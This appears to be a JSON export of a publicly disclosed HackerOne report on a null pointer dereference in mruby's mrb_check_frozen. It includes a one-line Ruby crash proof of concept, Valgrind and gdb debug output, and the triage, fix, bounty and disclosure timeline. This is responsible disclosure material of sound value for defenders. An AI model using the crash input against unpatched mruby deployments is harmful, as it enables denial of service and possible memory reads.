@@ -1,0 +1,304 @@
+{
+  "id": 621308,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MjEzMDg=",
+  "url": "https://hackerone.com/reports/621308",
+  "title": "NULL pointer dereference in `mrb_check_frozen`",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2019-06-19T21:15:30.505Z",
+  "submitted_at": "2019-06-19T21:15:30.505Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "dgaletic",
+    "url": "/dgaletic",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15668,
+    "url": "https://hackerone.com/shopify-scripts",
+    "handle": "shopify-scripts",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "shopify-scripts",
+      "twitter_handle": "",
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-09-04T13:46:21.053Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-09-03T10:30:33.002Z",
+  "team_member_agreed_on_going_public_at": "2019-09-04T13:46:20.956Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "PoC\n===\nThe following demonstrates a crash:\n\n```\n3735928559.remove_instance_variable '@a'\n```\n\nDebug info\n==========\nValgrind suggests the crash happens due to an invalid read in `mrb_check_frozen`:\n\n```\n==4882== Memcheck, a memory error detector\n==4882== Copyright (C) 2002-2017, and GNU GPL'd, by Julian Seward et al.\n==4882== Using Valgrind-3.14.0 and LibVEX; rerun with -h for copyright info\n==4882== Command: mruby eraser.rb\n==4882==\n==4882== Invalid read of size 4\n==4882==    at 0x115A64: mrb_check_frozen (mruby.h:1192)\n==4882==    by 0x1165F2: mrb_iv_remove (variable.c:524)\n==4882==    by 0x17E30B: mrb_obj_remove_instance_variable (kernel.c:642)\n==4882==    by 0x16A2CE: mrb_vm_exec (vm.c:1441)\n==4882==    by 0x166BD0: mrb_vm_run (vm.c:949)\n==4882==    by 0x17AC57: mrb_top_run (vm.c:2837)\n==4882==    by 0x153783: mrb_load_exec (parse.y:6318)\n==4882==    by 0x153A56: mrb_load_file_cxt (parse.y:6327)\n==4882==    by 0x10EE1C: main (mruby.c:270)\n==4882==  Address 0xdeadbeef is not stack'd, malloc'd or (recently) free'd\n==4882==\n==4882==\n==4882== Process terminating with default action of signal 11 (SIGSEGV): dumping core\n==4882==  Access not within mapped region at address 0xDEADBEEF\n==4882==    at 0x115A64: mrb_check_frozen (mruby.h:1192)\n==4882==    by 0x1165F2: mrb_iv_remove (variable.c:524)\n==4882==    by 0x17E30B: mrb_obj_remove_instance_variable (kernel.c:642)\n==4882==    by 0x16A2CE: mrb_vm_exec (vm.c:1441)\n==4882==    by 0x166BD0: mrb_vm_run (vm.c:949)\n==4882==    by 0x17AC57: mrb_top_run (vm.c:2837)\n==4882==    by 0x153783: mrb_load_exec (parse.y:6318)\n==4882==    by 0x153A56: mrb_load_file_cxt (parse.y:6327)\n==4882==    by 0x10EE1C: main (mruby.c:270)\n```\n\nExamining it in gdb shows an attempted dereference of the pointer `o`.\n\n```\n1190│ MRB_INLINE void mrb_check_frozen(mrb_state *mrb, void *o)\n1191│ {\n1192├─> if (MRB_FROZEN_P((struct RBasic*)o)) mrb_frozen_error(mrb, o);\n1193│ }\n```\n\nThe pointer, however, doesn't contain a valid address but a value controlled by\nthe attacker -- the integer from the POC on which `remove_instance_variable` was\ncalled.\n\n```\n(gdb) p o\n$2 = (void *) 0xdeadbeef\n(gdb) f 1\n#1  0x00005555555625f3 in mrb_iv_remove (mrb=0x55555565d260, obj=..., sym=1008) at src/variable.c:524\n(gdb) p obj\n$3 = {value = {f = 1.8457939563190925e-314, p = 0xdeadbeef, i = 3735928559, sym = 3735928559}, tt = MRB_TT_FIXNUM}\n```\n\nThe POC seems to work regardless of the number used, including `0`.\n\n==========\n\nTest platform\n=============\n* Arch Linux\n\nmruby SHA: c53b7cedccf7f5260dc8b4f88c5f93ea550bc5df\n\nThank you,\nDinko Galetic\nDenis Kasak\n\n## Impact\n\nDenial of service, with a possible information leak / arbitrary memory read because of the attacker-controlled address.",
+  "bounty_amount": "1000.0",
+  "formatted_bounty": "$1,000",
+  "weakness": {
+    "id": 51,
+    "name": "NULL Pointer Dereference"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 512733,
+      "file_name": "poc",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/512/733/69d58d25cd4939ab8ead31f1726d32115ef70884/poc?response-content-disposition=attachment%3B%20filename%3D%22poc%22%3B%20filename%2A%3DUTF-8%27%27poc&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ764WDPOT%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074013Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJGMEQCIEJCpOT%2FnLAxlJy%2B%2B%2Fa0A%2Fuz9UJx%2BTkeR616HCfZ%2Bl5TAiBPgAvOCdyFK%2Fsu0e4HNruMfHePWlQ2%2B7jDR3qgABsc6SqwBQgpEAMaDDAxMzYxOTI3NDg0OSIMf%2BnUXay0WVRe0QUAKo0FTe%2F3%2F5R16%2FajyCApoURehraE8bgx4wMDslPTf6h5vkZ7QkD6mew0zmZSVVL71O%2BS%2FAAsUL9gjR64cxjTN0fyO6swbmSDfmOouN8529hjbJrHwKh%2Bg%2FqR14Qh%2FwtS9MNlvaaaFYjm15dxLjR1qbkNoM2VW66X%2BaIjFo%2Bjm1L3h4YvC7uD%2BkF5SvvermW8bkX9PbMNWbV0ri7d4nxEYyfmSygHPF3jBUj9qKtE5jIFlUFX7quLROd7IFutIjfbr9BzD5XjBcfDBgOelMJO%2FkBoiNdwlfV9uTG7ZKjiTRJNivEEwodRejMzwiSEZ6GcGSmQR9RpewFhhM%2Fz%2BYkhlE7gFMjx24KTCJ1K3CyskWpwdC68JN9Y8hXezAl7pK2gf3r62LKzvw1%2FJhkqmVuo8i7XCkeS0MYtV7XnpE5p3jBHKTK7q%2FumHS%2FwzVymb2EeSXBP6qNbvr3O18rzDvbqY5uBkazVycShPwpL%2BBDoPdQ%2FbeFqcglYv2oAounyiTXR9eWNtzw8kEZw6AKflmPiQ0DprqSHaiMMAb55fo7dbXjwr20ktZwBZZqenOtvB7eyoQN%2BG2WqO0K44it4aGb6g8ehgYvsRelS0oR5XwTwu2o4F0Fj%2BADJ3%2F5TzGpfal1VqsaCMrr4em0aQJ3rb4Remj%2F%2BJTVleGnaKGbF2teDXflsoK2zwP9nkJ4nvashggxSrAZooM%2BU4pbkYzpxDwMNvMOJWFOf9GozT%2FooeLq5CYQghwJHMTpJ71dTOR%2FqvCNyL8BZYjJA7Wc19LQQ%2FS016DeF1wTf5sdMO0l86aHqv8BSk77LD335DPvtqsjzrJ7qieEjW9dMYJJFmqBMM1OoakNug2zY166La6bNXU3UQhYwjai6qAY6sgHNsBk5AOLuBX1agqrXZLp%2BOkzGnqFdy%2FkFHE6bDXd5K%2BxlNQa21ZdjhDZitHh8OyVITBolLS2EIAdcZfL%2FRZstKTGRFPqW5I%2BMNOHFKWShLCpyVIcbI8q0Una9aOqcZOJOiV54v4hLyirFWKBhoo1td8jT%2BsTbcVm%2BjosOM7etsoiTgM%2FlTBDyy%2BG06%2FdRbqpBa7eB3ENMxwVCTWHA0QHkY6jW1%2F7VKmtouFFTKpcdL3mX&X-Amz-SignedHeaders=host&X-Amz-Signature=bfd0422d36bd3e6f66b83028b8d64ac8af0efb1ec62de0cbbbae455b9f204077",
+      "file_size": 41,
+      "type": "text/plain",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-10-03T10:30:33.072Z",
+  "allow_singular_disclosure_after": -125356179.94902557,
+  "singular_disclosure_allowed": true,
+  "vote_count": 9,
+  "voters": [
+    "p1stachios",
+    "sameerphad72",
+    "ali",
+    "mik317",
+    "z41b1337_",
+    "unravel22",
+    "quixoticluck",
+    "tej333",
+    "thetiger"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 5150040,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Thank you for your report. We've reproduced the crash, and opened an upstream issue: https://github.com/mruby/mruby/issues/4519",
+      "automated_response": false,
+      "created_at": "2019-06-20T19:02:33.474Z",
+      "updated_at": "2019-06-20T19:02:33.474Z",
+      "actor": {
+        "username": "clayton",
+        "cleared": false,
+        "verified": false,
+        "url": "/clayton",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "shopify-scripts"
+    },
+    {
+      "id": 5157159,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "We suggested a fix for this [here](https://github.com/mruby/mruby/pull/4520).",
+      "automated_response": false,
+      "created_at": "2019-06-21T10:03:43.584Z",
+      "updated_at": "2019-06-21T10:03:43.584Z",
+      "actor": {
+        "username": "dgaletic",
+        "cleared": false,
+        "verified": false,
+        "url": "/dgaletic",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "shopify-scripts"
+    },
+    {
+      "id": 5191157,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Thanks again for your report. As you noted, this issue was addressed in the following upstream commit:\n\nhttps://github.com/mruby/mruby/commit/63d8b5e1e32cbbeb2368b06b3efa7723bf0677d2",
+      "automated_response": false,
+      "created_at": "2019-06-25T12:53:49.795Z",
+      "updated_at": "2019-06-25T12:53:49.795Z",
+      "actor": {
+        "username": "clayton",
+        "cleared": false,
+        "verified": false,
+        "url": "/clayton",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "dgaletic",
+        "url": "/dgaletic"
+      },
+      "genius_execution_id": null,
+      "team_handle": "shopify-scripts"
+    },
+    {
+      "id": 5191158,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "We're awarding a bounty of $1,000 for this report. We look forward to hearing from you again soon!",
+      "automated_response": false,
+      "created_at": "2019-06-25T12:54:43.936Z",
+      "updated_at": "2019-06-25T12:54:43.936Z",
+      "actor": {
+        "url": "/shopify-scripts",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "profile": {
+          "name": "shopify-scripts"
+        }
+      },
+      "bounty_amount": "1000.0",
+      "bonus_amount": "0.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "shopify-scripts",
+      "collaborator": {
+        "username": "dgaletic",
+        "url": "/dgaletic"
+      }
+    },
+    {
+      "id": 5717040,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-09-03T10:30:33.026Z",
+      "updated_at": "2019-09-03T10:30:33.026Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "dgaletic",
+        "cleared": false,
+        "verified": false,
+        "url": "/dgaletic",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "shopify-scripts"
+    },
+    {
+      "id": 5728489,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-09-04T13:46:20.982Z",
+      "updated_at": "2019-09-04T13:46:20.982Z",
+      "actor": {
+        "username": "clayton",
+        "cleared": false,
+        "verified": false,
+        "url": "/clayton",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "shopify-scripts"
+    },
+    {
+      "id": 5728490,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-09-04T13:46:21.077Z",
+      "updated_at": "2019-09-04T13:46:21.077Z",
+      "actor": {
+        "username": "clayton",
+        "cleared": false,
+        "verified": false,
+        "url": "/clayton",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "shopify-scripts"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
